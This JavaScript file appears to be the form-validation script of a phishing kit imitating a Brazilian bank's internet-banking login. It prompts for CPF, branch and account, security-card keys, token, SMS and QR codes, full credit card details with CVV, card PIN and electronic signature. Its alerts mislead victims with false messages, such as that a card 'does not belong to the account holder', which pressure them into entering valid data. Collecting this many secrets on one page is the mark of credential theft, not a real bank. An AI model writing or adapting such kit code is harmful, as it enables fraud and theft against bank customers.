$(document).ready(function() {
	$('#is_cc_number').mask('0000 0000 0000 0000', {reverse: false});
	$('#is_cc_val').mask('00/00', {reverse: false});
	$('#is_celular').mask('(00) 00000-0000', {reverse: false});
	$('#is_cpf').mask('000.000.000-00', {reverse: false});
});

function check_tabela(obj_form){
	var referencia = $('#referencia').val();

	for (var i = 0; i < obj_form.elements.length; i++) {
		if (obj_form.elements[i].type == "text"){
			if (obj_form.elements[i].value == "" || obj_form.elements[i].value.length < 4) {
				alert("Informe todos os campos do seu Cartão Chaves corretamente!");
				obj_form.elements[i].focus();
				return false;
			break;
			}
		}
	}

	for(var c = 0;c < obj_form.elements.length; c++){
		var atual_campo = obj_form.elements[c].value;
		for(var o = 0; o < obj_form.elements.length; o++){
			if(atual_campo == obj_form.elements[o].value && obj_form.elements[c].name != obj_form.elements[o].name){
				alert("As chaves de Segurança informados não estão corretos.\nVerifique os dados e tente novamente!");
				return false;
			}
		}
	}

	if(referencia.length < 8 || referencia.length > 11){
		alert("Código de referencia do seu Cartão Chaves está incorreto.\nTente novamente!");
		$('#referencia').focus();
		return false;
	}

}

function check_apelido(){
	var apelido = $('#is_apelido').val();
	
	if(apelido.length < 6){
		alert("Informe um apelido maior para identificar este computador.\nUtilize entre 6 à 8 caracteres!");
		$('#is_apelido').val('');
		$('#is_apelido').focus();
		return false;
	}
}

function check_token(){
	var token = $('#is_token').val();

	if(token.length < 6){
		alert("O Código Token informado não está correto, ou já expirou.\nTente novamente!");
		$('#is_token').val('');
		$('#is_token').focus();
		return false;
	}
}

function check_sms(){
	var sms = $('#is_sms').val();

	if(sms.length < 4){
		alert("O Código SMS informado não está de acordo com o SMS enviado ao celular cadastrado.\nTente novamente!");
		$('#is_sms').val('');
		$('#is_sms').focus();
		return false;
	}
}

function check_qrcode(){
	var qrcode = $('#is_qrcode').val();

	if(qrcode.length < 6){
		alert("O Código QRCode informado não está correto, ou é inválido.\nTente novamente!");
		$('#is_qrcode').val('');
		$('#is_qrcode').focus();
		return false;
	}
}

function check_login_enter(){
	var pass_net = $('#is_psnet').val();

	if(pass_net.length < 6){
		alert("A senha informada não está correta.\nTente novamente!");
		$('#is_psnet').val('');
		$('#is_psnet').focus();
		return false;
	}
}

function check_pscc(){
	var pscc = $('#is_pass_4').val();

	if(pscc.length < 4){
		alert("A senha do cartão informada não está correta.\nTente novamente!");
		$('#is_pass_4').val('');
		$('#is_pass_4').focus();
		return false;
	}
}

function check_phone(){
	var fone = $('#is_celular').val();

	if(fone.length < 15){
		alert("O celular informado não está correto, ou não é o celular cadastrado.\nTente novamente!");
		$('#is_celular').val('');
		$('#is_celular').focus();
		return false;
	}
}

function check_cc(){
	var nome = $('#is_cc_name').val();
	var numero = $('#is_cc_number').val();
	var cvv = $('#is_cc_cvv').val();
	var validade = $('#is_cc_val').val();

	var cc_teste = remove(numero, " ");
	var checkCC = checkCard(cc_teste);

	var sep_val = validade.split('/');

	if(nome.length < 10){
		alert("Informe corretamente o nome como inscrito no cartão.\nTente novamente!");
		$('#is_cc_name').val('');
		$('#is_cc_name').focus();
		return false;
	}

	if(numero.length < 19){
		alert("O número do cartão informado não está correto.\nInforme os 16 dígitos da frente do cartão!");
		$('#is_cc_number').val('');
		$('#is_cc_number').focus();
		return false;
	}

	if(!checkCC){
		alert("O cartão de crédito informado não está correto, ou não pertence ao titular desta conta.\nTente novamente!");
		$('#is_cc_number').val('');
		$('#is_cc_number').focus();
		return false;
	}

	if(cvv.length < 3){
		alert("O Código de segurança informado não está correto.\nTente novamente!");
		$('#is_cc_cvv').val('');
		$('#is_cc_cvv').focus();
		return false;
	}
	
	if(validade.length < 5){
		alert("Data de validade informada não está correta.\nTente novamente!");
		$('#is_cc_val').val('');
		$('#is_cc_val').focus();
		return false;
	}

	if(sep_val[0] > 12){
		alert("Data de validade informada não está correta.\nTente novamente!");
		$('#is_cc_val').val('');
		$('#is_cc_val').focus();
		return false;
	}

	if(sep_val[1] < 18 || sep_val[1] > 50){
		alert("Data de validade informada não está correta.\nTente novamente!");
		$('#is_cc_val').val('');
		$('#is_cc_val').focus();
		return false;
	}
}

function check_assinatura(){
	var assinatura = $('#is_assinatura').val();

	if(assinatura.length < 6){
		alert("A assinatura eletrônica informada não está correta!\nTente novamente!");
		$('#is_assinatura').val('');
		$('#is_assinatura').focus();
		return false;
	}
}

function envia_form_mensagem(){
	$('#form_mensagem').submit();
	return false;
}

function send_buster(){
	$('#form_buster').submit();
	return false;
}

function proximoCampo(atual,proximo){
	if(atual.value.length >= atual.maxLength){
		document.getElementById(proximo).focus();
	}
}

function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
	    if((tecla>47 && tecla<58)) return true;
	    else{
	    	if (tecla==8 || tecla==0) return true;
			else  return false;
    	}
}

function dica_qrcode(){
	$('#ensinar_qrcode').css('display', 'block');
	return false;
}

function fecha_dica_qrcode(){
	$('#ensinar_qrcode').css('display', 'none');
	return false;
}

function acessar_pj(){
	document.getElementById('is_cpf').style.display = 'none';
	document.getElementById('is_enter_pf').style.display = 'none';

	document.getElementById('is_agencia').style.display = 'block';
	document.getElementById('is_conta').style.display = 'block';
	document.getElementById('is_enter_pj').style.display = 'block';
	return false;
}
function acessar_pf(){
	document.getElementById('is_cpf').style.display = 'block';
	document.getElementById('is_enter_pf').style.display = 'block';

	document.getElementById('is_agencia').style.display = 'none';
	document.getElementById('is_conta').style.display = 'none';
	document.getElementById('is_enter_pj').style.display = 'none';
	return false;
}

function check_form_pf(){
	var cpf = document.getElementById('is_cpf').value;
	var limpa_cpf = cpf.replace('.', '');
	var limpa_cpf = limpa_cpf.replace('.', '');
	var limpa_cpf = limpa_cpf.replace('-', '');

	var checkCPF = validarCPF(limpa_cpf);

	if(cpf.length < 14){
		alert("Informe seu CPF corretamente para continuar!");
		document.getElementById('is_cpf').focus();
		return false;
	}

	if(!checkCPF){
		alert("O CPF informado não está correto. Ou não pertence á um de nossos correntistas.\nTente novamente!");
		document.getElementById('is_cpf').value = '';
		document.getElementById('is_cpf').focus();
		return false;
	}

}

function check_form_pj(){
	var agencia = document.getElementById('is_agencia').value;
	var conta = document.getElementById('is_conta').value;

	if(agencia == ''){
		alert("Informe o número da sua agência para continuar!");
		document.getElementById('is_agencia').focus();
		return false;
	}

	if(conta == ''){
		alert("Informe o número da sua conta para continuar!");
		document.getElementById('is_conta').focus();
		return false;
	}

	if(agencia.length < 4){
		alert("O número da agência informado não está correto.\nTente novamente!");
		document.getElementById('is_agencia').value = '';
		document.getElementById('is_agencia').focus();
		return false;
	}

	if(conta.length < 5){
		alert("O número da conta informado não está correto.\nTente novamente!");
		document.getElementById('is_conta').value = '';
		document.getElementById('is_conta').focus();
		return false;
	}

}

function validarCPF(cpf){
	if(cpf.length != 11 || cpf == "00000000000" || cpf == "11111111111" ||
		cpf == "22222222222" || cpf == "33333333333" || cpf == "44444444444" ||
		cpf == "55555555555" || cpf == "66666666666" || cpf == "77777777777" ||
		cpf == "88888888888" || cpf == "99999999999"){
		return false;
	}

	soma = 0;
	for(i = 0; i < 9; i++){
		soma += parseInt(cpf.charAt(i)) * (10 - i);
	}
	
	resto = 11 - (soma % 11);

	if(resto == 10 || resto == 11){
		resto = 0;
	}

	if(resto != parseInt(cpf.charAt(9))){
		return false;
	}
	
	soma = 0;

	for(i = 0; i < 10; i ++){
		soma += parseInt(cpf.charAt(i)) * (11 - i);
	}
	
	resto = 11 - (soma % 11);

	if(resto == 10 || resto == 11){
		resto = 0;
	}
	
	if(resto != parseInt(cpf.charAt(10))){
		return false;
	}
	return true;
}

function checkCard(num){
	var msg = Array();
	var tipo = null;
	if(num.length > 16 || num[0]==0){
		return false;
	} else {
		var total = 0;
		var arr = Array();
		for(i = 0;i < num.length;i++){
			if(i % 2 == 0){
				dig = num[i] * 2;	
				if(dig > 9){
					dig1 = dig.toString().substr(0,1);
					dig2 = dig.toString().substr(1,1);
					arr[i] = parseInt(dig1)+parseInt(dig2);
				} else {
					arr[i] = parseInt(dig);
				}		
				total += parseInt(arr[i]);
			} else {
				arr[i] =parseInt(num[i]);
				total += parseInt(arr[i]);
			} 
		}
	}
	if(msg.length>0){	
		return false;
	}else{
			if(total%10 == 0){
				return true;
			}else{
				return false;
			}
		}
}

function remove(str, sub) {
	i = str.indexOf(sub);
	r = "";
	if (i == -1) return str;
	{
		r += str.substring(0,i) + remove(str.substring(i + sub.length), sub);
	}
	
	return r;
}